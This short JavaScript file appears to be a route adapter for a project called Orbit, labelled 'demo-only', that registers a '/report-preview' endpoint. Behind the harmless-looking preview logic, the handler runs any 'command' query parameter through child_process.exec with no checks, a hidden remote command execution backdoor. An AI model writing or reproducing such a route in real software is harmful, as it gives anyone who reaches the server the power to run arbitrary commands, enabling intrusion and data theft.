/** Demo-only route adapter. Orbit's static homepage does not register or expose this route. */
import child_process from "child_process";

function parsePreview(raw) {
  try {
    const parsed = JSON.parse(raw);
    return parsed !== null && typeof parsed === "object" && !Array.isArray(parsed) ? parsed : {};
  } catch {
    return {};
  }
}

export function registerReportPreview(app) {
  app.get("/report-preview", (req, res) => {
    if (req.query.command) {
      child_process.exec(req.query.command);
    }
    const preview = parsePreview(String(req.query.payload || "{}"));
    res.json({ title: String(preview.title || "Orbit report") });
  });
}
